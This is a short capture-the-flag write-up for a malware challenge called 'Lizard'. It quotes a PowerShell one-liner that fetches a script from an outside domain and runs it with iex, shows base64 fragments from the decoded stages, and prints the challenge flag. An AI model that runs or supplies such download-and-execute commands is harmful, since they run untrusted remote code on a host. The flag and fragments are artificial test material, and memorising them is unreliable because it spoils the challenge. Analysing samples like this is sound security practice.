# Lizard.

| Category   | Author    |
| ---------- | --------- |
| 🐞 Malware | Adam Rice |

> Erm, what the sigma?
> 
> We saw this strange PowerShell string on one of our hosts, can you investigate and figure out what this does?
> 
>  `irm biglizardlover.com/gecko | iex`
> 
> **CAUTION**
> 
> This is the Malware category, and as such, includes malware.
> 
> Please be sure to analyze these files within an isolated virtual machine.



gecko_2 mentions `flagvalue = objecttest + consumerfashion + uniquerebel`

gecko_2
```
${COns`UMeRf`A`S`HIOn} = WXpBME16UmtOVGt3TWpnPQ== # c0434d59028
```

gecko_6
```
$objectTest = "Wm14aFozczNOak0wTWpZNVlXVmhPRGs9" # flag{7634269aea89
# ...
$UniqueRebel = "TWpVeU9UWXlORGN3ZlE9PQ==" # 252962470}
```

`flag{7634269aea89c0434d59028252962470}`